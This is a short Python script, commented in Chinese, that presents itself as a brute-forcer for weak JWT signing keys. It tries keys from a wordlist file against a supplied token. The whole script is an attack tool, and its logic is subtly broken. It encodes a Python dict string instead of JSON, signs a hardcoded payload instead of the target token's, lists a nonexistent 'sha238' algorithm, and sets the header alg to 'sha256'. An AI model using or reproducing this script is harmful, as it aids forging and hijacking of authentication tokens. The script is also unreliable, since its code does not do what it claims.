import argparse
import hmac
import base64
import sys
import termcolor

# 可选的签名算法
SUPPORTED_ALGORITHMS = ['sha256','sha238','sha512']

# 解析命令行参数
parser = argparse.ArgumentParser(description='爆破JWT弱密钥')
parser.add_argument('-jwt', help='要爆破的JWT字符串', type=str, default=None)
parser.add_argument('-alg', help=f'签名算法，可选值为{SUPPORTED_ALGORITHMS}中的一种，默认为sha256', type=str, default='sha256')

args = parser.parse_args()

# 检查alg参数是否合法
if args.alg not in SUPPORTED_ALGORITHMS:
    print(termcolor.colored(f'错误：不支持的签名算法"{args.alg}"，可选算法为{SUPPORTED_ALGORITHMS}中的一种', 'red'))
    sys.exit(1)

# 检查jwt参数是否存在
if args.jwt is None:
    print(termcolor.colored('错误：请提供要爆破的JWT字符串', 'red'))
    sys.exit(1)

# 从key.txt中读取private_key
with open('key.txt', 'r') as f:
    keys = f.read().splitlines()

# 构造JWT的header和payload
header = {
    'alg': args.alg,
    'typ': 'JWT'
}
payload = {
    'sub': '1234567890',
    'name': 'John Doe',
    'hahah': ' 2222',
    'password': '12345',
    'iat': 1516239022
}

# 对header和payload进行编码
header_enc = base64.urlsafe_b64encode(str(header).encode()).decode().strip('=')
payload_enc = base64.urlsafe_b64encode(str(payload).encode()).decode().strip('=')

# 初始化标志变量
found = False

# 对每一个private_key生成jwt_token，并查找是否存在与指定jwt相同的token
for private_key in keys:
    # 使用private_key对header和payload进行签名
    signature = hmac.new(private_key.encode(), f"{header_enc}.{payload_enc}".encode(), args.alg).digest()
    signature_enc = base64.urlsafe_b64encode(signature).decode().strip('=')

    # 拼接JWT字符串
    jwt_token = f"{header_enc}.{payload_enc}.{signature_enc}"

    # 将JWT字符串保存到文件中
    with open('jwt_token.txt', 'a') as f:
        f.write(jwt_token + '\n\n')

    # 如果jwt_token与指定的jwt相同，则输出对应的private_key
    if jwt_token == args.jwt:
        print(termcolor.colored(f'成功找到密钥，对应的private_key为"{private_key}"', 'green'))
        found = True
        break

# 如果未找到对应的private_key，则输出提示信息
if not found:
    print(termcolor.colored('未找到对应的密钥', 'yellow'))
